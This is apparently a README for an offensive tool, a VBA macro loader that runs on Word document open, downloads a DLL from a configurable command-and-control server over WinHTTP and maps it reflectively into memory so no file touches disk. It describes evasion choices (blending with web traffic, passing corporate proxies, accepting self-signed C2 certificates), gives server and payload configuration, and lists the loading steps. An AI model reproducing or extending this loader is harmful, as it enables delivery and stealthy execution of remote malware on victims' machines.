# Reflective DLL Loader — WinHTTP

Downloads a DLL over HTTP(S) via the WinHTTP API and manually maps it in Word's process — no file touches disk.

## What's here

- `ReflectiveLoader_WinHTTP_Standalone.bas` — the VBA loader (paste into a standard module)
- `ThisDocument.txt` — Document_Open hook to trigger on file open

## Why WinHTTP over raw TCP

The original loader uses a raw winsock connection, which exposes the C2 IP and port directly in the macro and generates unusual traffic. WinHTTP:

- Blends with normal web traffic (HTTP/HTTPS)
- Supports HTTPS with certificate validation bypass for self-signed C2 certs
- Uses a legitimate User-Agent string
- Passes through corporate proxies (WinHTTP respects system proxy settings)

## Server-side

Any HTTP server that serves the raw DLL bytes at the configured path. Examples:

```bash
# Python one-liner
python -m http.server 8080
# Place your DLL as payload.bin in the serving directory

# Or a simple Flask/Express/nginx endpoint
```

## Config

Edit the constants at the top of the `.bas` file:

```vba
Private Const SERVER_HOST As String = "192.168.1.100"
Private Const SERVER_PORT As Long = 8080
Private Const PAYLOAD_PATH As String = "/payload.bin"
Private Const USE_HTTPS As Boolean = False
Private Const USER_AGENT As String = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

Set `USE_HTTPS = True` for HTTPS. Self-signed certificates are accepted by default (controlled by `SECURITY_FLAG_IGNORE_ALL`).

## How it works

1. `WinHttpOpen` → `WinHttpConnect` → `WinHttpOpenRequest("GET", "/payload.bin")`
2. `WinHttpSendRequest` → `WinHttpReceiveResponse`
3. Check HTTP 200, then `WinHttpReadData` loop — DLL bytes land in a VBA byte array
4. Same PE mapping engine as the TCP variant: parse headers, VirtualAlloc, map sections, apply relocations, resolve imports, call DllMain via CallWindowProcW trampoline
